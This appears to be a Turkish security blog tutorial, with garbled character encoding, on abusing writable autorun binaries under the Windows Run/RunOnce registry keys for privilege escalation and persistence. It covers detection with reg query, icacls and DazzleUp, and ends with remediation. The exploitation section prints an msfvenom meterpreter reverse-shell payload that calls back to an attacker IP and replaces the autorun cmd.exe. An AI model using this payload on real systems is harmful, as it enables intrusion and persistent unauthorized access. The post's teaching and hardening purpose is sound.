I"ª'<h2 id="Ã¶zet">Ã–zet</h2>

<p>Windows KayÄ±t Defteri (Registery), yÃ¼klÃ¼ programlar ve donanÄ±mlar iÃ§in bilgiler, ayarlar, seÃ§enekler ve diÄŸer deÄŸerleri tutar. KayÄ±t defterini, iÅŸletim sistemi Ã§ekirdeÄŸi, aygÄ±t sÃ¼rÃ¼cÃ¼leri, hizmetler, hesap yÃ¶neticisi ve kullanÄ±cÄ± arabiriminin tÃ¼mÃ¼ kullanabilir.</p>

<p>Ä°ÅŸletim sisteminin iÃ§ine bu kadar yerleÅŸmiÅŸ bir araÃ§ kÃ¶tÃ¼ niyetli kullanÄ±mla iÅŸletim sisteminin iÅŸleyiÅŸinde ciddi deÄŸiÅŸikliklere yol aÃ§abilmektedir.</p>

<h2 id="detaylÄ±-bilgi">DetaylÄ± Bilgi</h2>

<p>Windows her oturum aÃ§Ä±lÄ±ÅŸÄ±nda istenen dosyalarÄ±n otomatik olarak baÅŸlatÄ±lmasÄ±nÄ± saÄŸlayan bir Ã¶zelliÄŸi vardÄ±r. Bu Ã¶zelliÄŸi kayÄ±t defteri Ã¼zerinden gerÃ§ekeÅŸtirmek iÃ§in Run ve RunOnce kayÄ±tlarÄ±na, Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ± istenen dosya yolu verilecek ÅŸekilde anahtar girilmelidir.
AÅŸaÄŸÄ±da ki kayÄ±tlar iÃ§erisine anahtar girilerek istenen dosyalar her oturum aÃ§Ä±lÄ±ÅŸÄ±nda Ã§aÄ±ÅŸtÄ±rÄ±labilir.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce
</code></pre></div></div>

<p>Her oturum aÃ§Ä±lÄ±ÅŸÄ±nda otomatik dosya Ã§alÄ±ÅŸtÄ±rma Windowsâ€™un saÄŸladÄ±ÄŸÄ± bir Ã¶zelliktir. Ancak yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ ise kÃ¶tÃ¼ niyetli kiÅŸiler tarafÄ±ndan istismar edilebilir. EÄŸer ki sisteme eriÅŸimi olan kÃ¶tÃ¼ niyetli kiÅŸi, otomatik baÅŸlatÄ±lan bu dosyalarÄ± deÄŸiÅŸtirme ayrÄ±calÄ±klarÄ±na sahipse ilgili dosyanÄ±n yerine kendi zararlÄ± yazÄ±lÄ±mÄ±nÄ± yerleÅŸtirerek, zararlÄ±nÄ±n her oturum aÃ§Ä±lÄ±ÅŸÄ±nda Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ± saÄŸlayacaktÄ±r. Elde ettiÄŸi eriÅŸim de, oturum aÃ§an kullanÄ±cÄ±nÄ±n ayrÄ±calÄ±klarÄ±na sahip olacaktÄ±r. Bu yÃ¶ntem hem hak yÃ¼kseltme yÃ¶ntemi hem de sistemde kalÄ±cÄ± olma yÃ¶ntemi olarak kullanÄ±labilmektedir.</p>

<h2 id="bulunmasÄ±">BulunmasÄ±</h2>

<p>MasaÃ¼stÃ¼nde bulunan CMD.exe uygulamasÄ±nÄ±n oturum aÃ§Ä±ldÄ±ÄŸÄ±nda otomatik olarak baÅŸlayacaÄŸÄ± senaryoyu inceleyelim. YanlÄ±ÅŸ yapÄ±landÄ±rma sonucunu otomatik olarak bulmak iÃ§in DazzleUpâ€™Ä± kullanabiliriz. Ã‡Ä±ktÄ± incelendiÄŸinde hangi kayÄ±t defteri anahtarÄ± ve hangi dosya olduÄŸu gÃ¶rÃ¼nmektedir. DazzleUpâ€™Ä±n verdiÄŸi ekran gÃ¶rÃ¼ntÃ¼sÃ¼ aÅŸaÄŸÄ±dadÄ±r.</p>

<p align="center">
	<img src="/images/mod_bin_save_autoun_ss/1.png" alt="" />
</p>

<p>Ä°lgili kayÄ±t, kayÄ±t defterinde arandÄ±ÄŸÄ±nda aÅŸaÄŸÄ±daki gibi gÃ¶zÃ¼kmektedir.</p>

<p align="center">
	<img src="/images/mod_bin_save_autoun_ss/2.png" alt="" />
</p>

<p>EÄŸer manuel olarak test edilmesi gerekirse ilk adÄ±mda hangi uygulamalarÄ±n baÅŸlangÄ±Ã§ uygulamasÄ± olduÄŸuna bakÄ±lmalÄ±. BaÅŸlangÄ±Ã§ uygulamalarÄ±nÄ±n tespiti iÃ§in;</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce
</code></pre></div></div>

<p>komutlarÄ± <strong>cmd</strong> ya da <strong>powershell</strong> Ã¼zerinden Ã§alÄ±ÅŸtÄ±rÄ±labilir. Ã–rnek Ã§Ä±ktÄ± aÅŸaÄŸÄ±da verilmiÅŸtir.</p>

<p align="center">
	<img src="/images/mod_bin_save_autoun_ss/3.png" alt="" />
</p>

<p><strong>NOT:</strong> HKCU o an ki kullanÄ±cÄ±yÄ± etkileyecektir. HKLM tÃ¼m makineyi etkileyecektir. Run her oturum aÃ§Ä±lÄ±ÅŸÄ±nda Ã§alÄ±ÅŸtÄ±rmaya devam edecek. RunOnce ise bir seferlik Ã§alÄ±ÅŸmasÄ±nÄ± saÄŸlayacaktÄ±r.</p>

<p>Bulunan baÅŸlangÄ±Ã§ uygulamalarÄ± Ã¼zerinde deÄŸiÅŸiklik yapma izninin olup olmadÄ±ÄŸÄ± araÅŸtÄ±rÄ±lmalÄ±dÄ±r. Bunun iÃ§in <strong>icacls.exe</strong> kullanÄ±labilir.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">icacls.exe</span><span class="w"> </span><span class="s2">"C:\Users\test\Desktop\cmd.exe"</span><span class="w">
</span></code></pre></div></div>

<p>UygulamanÄ±n <strong>test</strong> kullanÄ±cÄ±sÄ± tarafÄ±ndan deÄŸiÅŸtirilebilir olduÄŸu aÅŸaÄŸÄ±da ki ekran gÃ¶rÃ¼ntÃ¼sÃ¼nde gÃ¶sterilmiÅŸtir.</p>

<p align="center">
	<img src="/images/mod_bin_save_autoun_ss/4.png" alt="" />
</p>

<p><strong>NOT:</strong> Icacls size <strong>F</strong> (Full), <strong>M</strong> (Modify), <strong>RX</strong> (Read and Executable), <strong>R</strong> (Readonly), <strong>W</strong> (Writeonly) kÄ±saltÄ±lmÄ±ÅŸ olmak Ã¼zere bilgi verir.
AyrÄ±ca dosyanÄ±n <strong>GÃ¼venlik</strong> ayarlarÄ± da kullanÄ±labilir.</p>

<p align="center">
	<img src="/images/mod_bin_save_autoun_ss/5.png" alt="" />
</p>

<p>Bu hali ile cmd.exe dosyasÄ± test kullanÄ±cÄ±sÄ± tarafÄ±ndan deÄŸiÅŸtirilebilir olduÄŸu iÃ§in sistemde test kullanÄ±cÄ±sÄ± ile elde edilmiÅŸ bir oturum var ise bu dosya baÅŸka bir zararlÄ± yazÄ±lÄ±m ile aynÄ± isimde olacak ÅŸekilde deÄŸiÅŸtirilebilir. Bu saÄŸlandÄ±ÄŸÄ±nda her oturum aÃ§Ä±lÄ±ÅŸÄ±nda tekrar bir oturum elde edilecektir. Elde edilen uzak eriÅŸim, hangi kullanÄ±cÄ± oturum aÃ§tÄ± ise o kullanÄ±cÄ± Ã¼zerinden elde edilmiÅŸ olacaktÄ±r. EÄŸer Administrator kulllanÄ±cÄ±sÄ± ile oturum aÃ§Ä±lÄ±rsa sistemde Administrator kullanÄ±cÄ±sÄ± Ã¼zerinden bir uzak eriÅŸim elde edilecektir.</p>

<h2 id="iÌ‡stismar-edilmesi">Ä°stismar Edilmesi</h2>

<p>ZararlÄ± yazÄ±lÄ±m Ã¼retilerek sisteme ilgili dosyanÄ±n yerine yerleÅŸtirilecektir. Bunun iÃ§in ilk adÄ±mda zararlÄ± Ã¼retilecektir. ZararlÄ±nÄ±n Ã¼retildiÄŸine dair ekran gÃ¶rÃ¼ntÃ¼sÃ¼ aÅŸaÄŸÄ±da verilmiÅŸtir.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">--platform</span> windows <span class="nt">-a</span> x64 <span class="nt">-p</span> windows/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.6.182 <span class="nv">LPORT</span><span class="o">=</span>445 <span class="nt">-f</span> exe <span class="nt">-o</span> cmd.exe
</code></pre></div></div>
<p align="center">
	<img src="/images/mod_bin_save_autoun_ss/6.png" alt="" />
</p>

<p>Ä°lgili dosyanÄ±n hedef makineye daha Ã¶nceden elde edilmiÅŸ bir oturum Ã¼zerinden yÃ¼klenmesine dair ekran gÃ¶rÃ¼ntÃ¼sÃ¼ aÅŸaÄŸÄ±da verilmiÅŸtir.</p>

<p align="center">
	<img src="/images/mod_bin_save_autoun_ss/7.png" alt="" />
</p>

<p>Administrator kullanÄ±cÄ±sÄ± oturum aÃ§tÄ±ÄŸÄ±nda elde edilecek oturum Administrator kullanÄ±cÄ±sÄ± ayrÄ±calÄ±klarÄ±nda olacaktÄ±r. BÃ¶ylece hak yÃ¼kseltme yapÄ±labilecektir. EÄŸer baÅŸka kullanÄ±cÄ± oturum aÃ§arsa elde edilecek oturum o kullanÄ±cÄ±nÄ±n ayrÄ±calÄ±klarÄ±nda olacaktÄ±r. <strong>Administrator</strong> kullanÄ±cÄ±sÄ± oturum aÃ§tÄ±ÄŸÄ±nda elde edilen oturumun ekran gÃ¶rÃ¼ntÃ¼sÃ¼ aÅŸaÄŸÄ±dadÄ±r.</p>

<p align="center">
	<img src="/images/mod_bin_save_autoun_ss/8.png" alt="" />
</p>

<p><strong>NOT:</strong> Dosya kimler tarafÄ±ndan Ã§alÄ±ÅŸtÄ±rÄ±labilir iznine sahipse sadece o kullanÄ±cÄ±lardan eriÅŸim elde edilebilir. Ã–rnek olarak dosya izinlerine <strong>Everyone</strong> eklenirse her kullanÄ±cÄ± bu dosyayÄ± Ã§alÄ±ÅŸtÄ±rabileceÄŸi iÃ§in her kullanÄ±cÄ± oturum aÃ§tÄ±ÄŸÄ±nda oturum elde edilebilir olacaktÄ±r. Everyone izinleri aÃ§Ä±ldÄ±ÄŸÄ±na dair ekran gÃ¶rÃ¼ntÃ¼sÃ¼ aÅŸaÄŸÄ±da verilmiÅŸtir.</p>

<p align="center">
	<img src="/images/mod_bin_save_autoun_ss/9.png" alt="" />
</p>

<p>Ã–rneÄŸin <strong>user1</strong> kullanÄ±cÄ±sÄ±nÄ±n oturum aÃ§tÄ±ÄŸÄ±nda elde edilen oturum aÅŸaÄŸÄ±da gÃ¶sterilmiÅŸtir.</p>

<p align="center">
	<img src="/images/mod_bin_save_autoun_ss/10.png" alt="" />
</p>

<h2 id="Ã§Ã¶zÃ¼m">Ã‡Ã¶zÃ¼m</h2>

<p>Mevcut durumu gidermek iÃ§in eÄŸer baÅŸlangÄ±Ã§ta dosyanÄ±n Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ± gerekiyorsa dosya deÄŸiÅŸtirme ve Ã§alÄ±ÅŸtÄ±rma izinlerini dÃ¼zenleyebilirsiniz. BÃ¶ylelikle sadece istenen kullanÄ±cÄ± oturum aÃ§tÄ±ÄŸÄ±nda dosya Ã§alÄ±ÅŸmÄ±ÅŸ olacak.</p>

<p>Bir diÄŸer yÃ¶ntem ise yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ anahtarlarÄ± silmek olacaktÄ±r ancak Windowsâ€™un saÄŸladÄ±ÄŸÄ± bir Ã¶zelliÄŸi kullanmamak olacaktÄ±r. Bunun yerine hatalÄ± yapÄ±landÄ±rmalarÄ± dÃ¼zenlemek en mantÄ±klÄ±sÄ± olacaktÄ±r. YanlÄ±ÅŸ yapÄ±landÄ±rmanÄ±n olabileceÄŸi kayÄ±tlar;</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce
</code></pre></div></div>

<p>iÃ§erisinde bulunabilir.
YanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ anahtarÄ±n temizlendiÄŸine dair ekran gÃ¶rÃ¼ntÃ¼sÃ¼ aÅŸaÄŸÄ±da verilmiÅŸtir.</p>

<p align="center">
	<img src="/images/mod_bin_save_autoun_ss/11.png" alt="" />
</p>

<p>HatalÄ± yapÄ±landÄ±rmanÄ±n giderildiÄŸine dair ekran gÃ¶rÃ¼ntÃ¼sÃ¼ aÅŸaÄŸÄ±da verilmiÅŸtir.</p>

<p align="center">
	<img src="/images/mod_bin_save_autoun_ss/12.png" alt="" />
</p>

<h2 id="kaynakÃ§a">KaynakÃ§a:</h2>

<ul>
  <li>https://en.wikipedia.org/wiki/Windows_Registry</li>
  <li>https://docs.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys</li>
  <li>https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls</li>
  <li>https://github.com/hlldz/dazzleUP</li>
</ul>
:ET